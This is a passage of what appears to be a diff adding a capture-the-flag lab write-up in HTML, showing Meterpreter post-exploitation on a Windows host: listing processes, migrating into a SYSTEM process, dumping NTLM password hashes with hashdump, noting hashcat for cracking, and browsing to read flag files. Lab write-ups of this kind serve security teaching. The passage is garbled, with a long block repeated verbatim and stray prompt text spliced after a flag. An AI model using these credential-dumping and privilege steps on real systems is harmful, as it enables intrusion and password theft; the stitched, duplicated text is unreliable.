+ 892   700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+ 940   700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+ 1012  824   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\wbem\WmiPrvSE.exe
+ 1068  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+ 1160  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+ 1292  700   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\spoolsv.exe
+ 1328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+ 1380  2856  powershell.exe        x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 1392  700   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1468  700   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\Xentools\LiteAgent.exe
+ 1588  700   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1780  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+ 1856  2200  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 1936  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+ 1940  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+ 2144  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+ 2200  700   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2216  2504  cmd.exe               x86   0        NT AUTHORITY\SYSTEM
+C:\Windows\SysWOW64\cmd.exe
+ 2328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+ 2360  700   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\sppsvc.exe
+ 2428  700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
+ 2504  1380  powershell.exe        x86   0        NT AUTHORITY\SYSTEM
+C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
+ 2560  700   vds.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\vds.exe
+ 2664  700   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\SearchIndexer.exe
+ 2796  1292  cmd.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\cmd.exe
+ 3020  700   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\servicing\TrustedInstaller.exe
+
+</code></pre><p>We write down the process id 2796.</p>
+<ol start="8">
+<li>We migrate to the process whose id we noted:</li>
+</ol>
+<pre><code>meterpreter &gt; migrate 2796
+[*] Migrating from 2504 to 2796...
+[*] Migration completed successfully.
+</code></pre><h2 id="task-4-cracking">Task 4: Cracking</h2>
+<ol>
+<li>We run the command hashdump.</li>
+</ol>
+<pre><code>meterpreter &gt; hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</code></pre><p>So the user is Jon.</p>
+<ol start="2">
+<li>Windows uses LM and NTLM hashing. We crack the hashes using hashcat</li>
+</ol>
+<pre><code></code></pre><h2 id="task-5-find-flags">Task 5: Find flags!</h2>
+<ol>
+<li></li>
+</ol>
+<pre><code>meterpreter &gt; cd C:\\
+meterpreter &gt; ls
+Listing: C:\
+============
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   0        dir   2009-07-13 23:18:56 -0400  $Recycle.Bin
+40777/rwxrwxrwx   0        dir   2009-07-14 01:08:56 -0400  Documents and
+Settings
+40777/rwxrwxrwx   0        dir   2009-07-13 23:20:08 -0400  PerfLogs
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Program Files
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Program Files (x86)
+40777/rwxrwxrwx   4096     dir   2009-07-13 23:20:08 -0400  ProgramData
+40777/rwxrwxrwx   0        dir   2018-12-12 22:13:22 -0500  Recovery
+40777/rwxrwxrwx   4096     dir   2018-12-12 18:01:17 -0500  System Volume
+Information
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Users
+40777/rwxrwxrwx   16384    dir   2009-07-13 23:20:08 -0400  Windows
+100666/rw-rw-rw-  24       fil   2018-12-12 22:47:39 -0500  flag1.txt
+0000/---------    2141120  fif   1970-01-30 18:20:00 -0500  hiberfil.sys
+0000/---------    2141120  fif   1970-01-30 18:20:00 -0500  pagefile.sys
+
+meterpreter &gt; cat flag1.txt 
+flag{access_the_machine}
+</code></pre><ol start="2">
+<li></li>
+</ol>
+<pre><code>meterpreter &gt; pwd
+C:\Windows\System32\config
+meterpreter &gt; ls
+Listing: C:\Windows\System32\config
+===================================
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+100666/rw-rw-rw-  28672     fil   2009-07-14 01:32:39 -0400  BCD-Template
+100666/rw-rw-rw-  25600     fil   2009-07-14 01:38:35 -0400  BCD-Template.LOG
+100666/rw-rw-rw-  18087936  fil   2009-07-13 22:34:08 -0400  COMPONENTS
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  COMPONENTS.LOG
+100666/rw-rw-rw-  13312     fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG2
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms
+100666/rw-rw-rw-  65536     fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf
+100666/rw-rw-rw-  65536     fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  DEFAULT
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  DEFAULT.LOG
+100666/rw-rw-rw-  177152    fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0         dir   2009-07-13 23:20:10 -0400  Journal
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  RegBack
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SAM
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  SAM.LOG
+100666/rw-rw-rw-  21504     fil   2009-07-13 22:34:08 -0400  SAM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SAM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SECURITY
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SECURITY.LOG
+100666/rw-rw-rw-  21504     fil   2009-07-13 22:34:08 -0400  SECURITY.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SECURITY.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:08 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  40632320  fil   2009-07-13 22:34:08 -0400  SOFTWARE
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SOFTWARE.LOG
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SOFTWARE.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SOFTWARE.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  12582912  fil   2009-07-13 22:34:08 -0400  SYSTEM
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SYSTEM.LOG
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SYSTEM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:21:15 -0400
+SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  TxR
+100666/rw-rw-rw-  34        fil   2018-12-12 22:48:22 -0500  flag2.txt
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  systemprofile
+
+meterpreter &gt; cat flag2.txt 
+flag{sam_database_elevated_access}
+</code></pre><ol start="3">
+<li></li>
+</ol>
+<pre><code>meterpreter &gt; cd Users 
+lmeterpreter &gt; ls
+Listing: C:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  All Users
+40555/r-xr-xr-x   8192  dir   2009-07-13 23:20:08 -0400  Default
+40777/rwxrwxrwx   0     dir   2009-07-14 01:08:56 -0400  Default User
+40777/rwxrwxrwx   8192  dir   2018-12-12 22:13:28 -0500  Jon
+40555/r-xr-xr-x   4096  dir   2009-07-13 23:20:08 -0400  Public
+100666/rw-rw-rw-  174   fil   2009-07-14 00:54:24 -0400  desktop.ini
+
+meterpreter &gt; cd Jon 
+meterpreter &gt; ls
+Listing: C:\Users\Jon
+=====================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  AppData
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Application Data
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:37 -0500  Contacts
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Cookies
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Desktop
+40555/r-xr-xr-x   4096    dir   2018-12-12 22:13:31 -0500  Documents
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Downloads
+40555/r-xr-xr-x   4096    dir   2018-12-12 22:13:31 -0500  Favorites
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Links
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Local Settings
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Music
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  My Documents
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500  NTUSER.DAT
+100666/rw-rw-rw-  65536   fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288  fil   2018-12-12 22:13:31 -0500
+NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  NetHood
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Pictures
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  PrintHood
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Recent
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Saved Games
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:45 -0500  Searches
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  SendTo
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Start Menu
+40777/rwxrwxrwx   0       dir   2018-12-12 22:13:31 -0500  Templates
+40555/r-xr-xr-x   0       dir   2018-12-12 22:13:31 -0500  Videos
+100666/rw-rw-rw-  262144  fil   2018-12-12 22:13:31 -0500  ntuser.dat.LOG1
+100666/rw-rw-rw-  0       fil   2018-12-12 22:13:31 -0500  ntuser.dat.LOG2
+100666/rw-rw-rw-  20      fil   2018-12-12 22:13:31 -0500  ntuser.ini
+
+meterpreter &gt; cd Documents 
+meterpreter &gt; ls
+Listing: C:\Users\Jon\Documents
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Music
+40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Pictures
+40777/rwxrwxrwx   0     dir   2018-12-12 22:13:31 -0500  My Videos
+100666/rw-rw-rw-  402   fil   2018-12-12 22:13:45 -0500  desktop.ini
+100666/rw-rw-rw-  37    fil   2018-12-12 22:49:18 -0500  flag3.txt
+
+meterpreter &gt; cat flag3.txt 
+flag{admin_documents_can_be_valuable}\Windows\system32&gt;
+</code></pre><p>So, we are in fact system!</p>
+<ol start="7">
+<li>We enter the command <code>ps</code> to view the running processes</li>
+</ol>
+<pre><code>C:\Windows\system32&gt;^Z
+Background channel 1? [y/N]  y
+meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                    Path
+ ---   ----  ----                  ----  -------  ----                    ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 396   652   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM     C:\Windows\System32\LogonUI.exe
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\smss.exe
+ 428   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\svchost.exe
+ 536   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\svchost.exe
+ 552   544   csrss.exe             x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\csrss.exe
+ 600   544   wininit.exe           x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\wininit.exe
+ 612   592   csrss.exe             x64   1        NT AUTHORITY\SYSTEM     C:\Windows\System32\csrss.exe
+ 652   592   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM     C:\Windows\System32\winlogon.exe
+ 700   600   services.exe          x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\services.exe
+ 708   600   lsass.exe             x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\lsass.exe
+ 716   600   lsm.exe               x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\lsm.exe
+ 824   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\svchost.exe
+ 892   700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+ 940   700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+ 1012  824   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\wbem\WmiPrvSE.exe
+ 1068  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+ 1160  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+ 1292  700   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\spoolsv.exe
+ 1328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+ 1380  2856  powershell.exe        x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ 1392  700   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1468  700   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\Xentools\LiteAgent.exe
+ 1588  700   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM
+C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1780  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+ 1856  2200  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 1936  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+ 1940  700   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\svchost.exe
+ 2144  552   conhost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\conhost.exe
+ 2200  700   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
+ 2216  2504  cmd.exe               x86   0        NT AUTHORITY\SYSTEM
+C:\Windows\SysWOW64\cmd.exe
+ 2328  700   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+C:\Windows\System32\svchost.exe
+ 2360  700   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+C:\Windows\System32\sppsvc.exe
+ 2428  700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
+ 2504  1380  powershell.exe        x86   0        NT AUTHORITY\SYSTEM
+C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
+ 2560  700   vds.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\vds.exe
+ 2664  700   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\SearchIndexer.exe
+ 2796  1292  cmd.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\cmd.exe
+ 3020  700   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\servicing\TrustedInstaller.exe
+
+</code></pre><p>We write down the process id 2796.</p>
+<ol start="8">
+<li>We migrate to the process whose id we noted:</li>
+</ol>
+<pre><code>meterpreter &gt; migrate 2796
+[*] Migrating from 2504 to 2796...
+[*] Migration completed successfully.
+</code></pre><h2 id="task-4-cracking-1">Task 4: Cracking</h2>
+<ol>
+<li>We run the command hashdump.</li>
+</ol>
+<pre><code>meterpreter &gt; hashdump 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</code></pre><p>So the user is Jon.</p>
+<ol start="2">
+<li>Windows uses LM and NTLM hashing. We crack the hashes using hashcat</li>
+</ol>
+<pre><code></code></pre><h2 id="task-5-find-flags-1">Task 5: Find flags!</h2>
+<ol>
+<li></li>
+</ol>
+<pre><code>meterpreter &gt; cd C:\\
+meterpreter &gt; ls
+Listing: C:\
+============
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+40777/rwxrwxrwx   0        dir   2009-07-13 23:18:56 -0400  $Recycle.Bin
+40777/rwxrwxrwx   0        dir   2009-07-14 01:08:56 -0400  Documents and
+Settings
+40777/rwxrwxrwx   0        dir   2009-07-13 23:20:08 -0400  PerfLogs
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Program Files
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Program Files (x86)
+40777/rwxrwxrwx   4096     dir   2009-07-13 23:20:08 -0400  ProgramData
+40777/rwxrwxrwx   0        dir   2018-12-12 22:13:22 -0500  Recovery
+40777/rwxrwxrwx   4096     dir   2018-12-12 18:01:17 -0500  System Volume
+Information
+40555/r-xr-xr-x   4096     dir   2009-07-13 23:20:08 -0400  Users
+40777/rwxrwxrwx   16384    dir   2009-07-13 23:20:08 -0400  Windows
+100666/rw-rw-rw-  24       fil   2018-12-12 22:47:39 -0500  flag1.txt
+0000/---------    2141120  fif   1970-01-30 18:20:00 -0500  hiberfil.sys
+0000/---------    2141120  fif   1970-01-30 18:20:00 -0500  pagefile.sys
+
+meterpreter &gt; cat flag1.txt 
+flag{access_the_machine}
+</code></pre><ol start="2">
+<li></li>
+</ol>
+<pre><code>meterpreter &gt; pwd
+C:\Windows\System32\config
+meterpreter &gt; ls
+Listing: C:\Windows\System32\config
+===================================
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+100666/rw-rw-rw-  28672     fil   2009-07-14 01:32:39 -0400  BCD-Template
+100666/rw-rw-rw-  25600     fil   2009-07-14 01:38:35 -0400  BCD-Template.LOG
+100666/rw-rw-rw-  18087936  fil   2009-07-13 22:34:08 -0400  COMPONENTS
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  COMPONENTS.LOG
+100666/rw-rw-rw-  13312     fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  COMPONENTS.LOG2
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms
+100666/rw-rw-rw-  1048576   fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms
+100666/rw-rw-rw-  65536     fil   2020-03-25 15:20:45 -0400
+COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf
+100666/rw-rw-rw-  65536     fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2009-07-14 00:54:56 -0400
+COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  DEFAULT
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  DEFAULT.LOG
+100666/rw-rw-rw-  177152    fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  DEFAULT.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+40777/rwxrwxrwx   0         dir   2009-07-13 23:20:10 -0400  Journal
+40777/rwxrwxrwx   4096      dir   2009-07-13 23:20:10 -0400  RegBack
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SAM
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:31 -0400  SAM.LOG
+100666/rw-rw-rw-  21504     fil   2009-07-13 22:34:08 -0400  SAM.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SAM.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SECURITY
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SECURITY.LOG
+100666/rw-rw-rw-  21504     fil   2009-07-13 22:34:08 -0400  SECURITY.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SECURITY.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:22:08 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
+100666/rw-rw-rw-  524288    fil   2019-03-17 18:22:09 -0400
+SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
+100666/rw-rw-rw-  40632320  fil   2009-07-13 22:34:08 -0400  SOFTWARE
+100666/rw-rw-rw-  1024      fil   2009-07-14 03:07:30 -0400  SOFTWARE.LOG
+100666/rw-rw-rw-  262144    fil   2009-07-13 22:34:08 -0400  SOFTWARE.LOG1
+100666/rw-rw-rw-  0         fil   2009-07-13 22:34:08 -0400  SOFTWARE.LOG2
+100666/rw-rw-rw-  65536     fil   2019-03-17 18:21:18 -0400
+SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
